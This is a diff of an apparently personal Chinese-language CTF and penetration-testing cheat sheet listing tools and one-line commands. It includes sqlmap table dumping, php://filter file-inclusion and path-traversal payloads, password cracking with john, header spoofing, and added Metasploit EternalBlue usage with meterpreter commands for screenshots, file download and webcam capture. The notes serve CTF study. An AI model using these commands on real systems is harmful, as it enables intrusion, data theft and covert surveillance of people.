@@ -8,7 +8,7 @@
 6 yijian 强大的工具
 7 zip2john zip压缩包路径 >passwd.txt(获得hash文件);john passwd.txt 最终获得密码
 8 ida64 查看源代码,逆向相关
-9 sqlmap 扫描网站类型以及是否可以注入
+9 sqlmap 扫描网站类型以及是否可以注入  sqlmap -u url/id=1 --tables ,--dump
 10 chrome 扩展插件(hackbar),类似于重发器
 11 base64转换 echo '需要转换的内容'  |base64
 12 nmap 端口扫描神器 nmap -A -T4 ip
@@ -31,7 +31,7 @@
 29 post传参 curl -d 'what=flag' url 给url传递"what=flag"
 30 zsteg  检测图片是否行有lsb隐写内容
 31 unar解压文件就不会乱码
-32 本地文件包含 ?file=php://filter/read/convert.base64-encode/resource=flag.php
+32 本地文件包含  php读取文件 ?file=php://filter/read/convert.base64-encode/resource=flag.php     
 33 Secret File 构造pyload ?file=php://filter/convert.base64-encode/resource=flag.php
 34 php代码审计source.php?file=source.php?/../../../../ffffllllaaaagggg 
 35 dbeaver 数据库图形化软件
@@ -55,7 +55,20 @@
 43 git stash pop/list
 44 svn泄漏 dvcs-ripper 工具中的 rip-svn.pl rip-svn -u url  cd .svn;cat wc.db |grep -a flag 然后慢慢找
 45 rip-hg -u url/.hg/ hg status;如果服务端删除了 flag 文件的话，那么可尝试从历史记录里寻找。路径是 .hg/store/data/
-46 
+46 提交代码 git add . && git push
+47 X-Forwarded-For:123.123.123.123   模拟ip
+    Referer:https://www.google.com   模拟网页请求
+48 flask-session-cookie-manager
+49 msfconsole targer32 使用eternalblue_doublepulsar use exploit/windows/smb/eternalblue_doublepulsar
+解决乱码
+chcp 65001  字符乱码
+screenshot   截屏
+download AHK.ahk  下载文件
+webcam_snap 拍照
+webcam_stream  网页拍照
+
+50
+ 
 
 
 _______________文件头______________________________________________
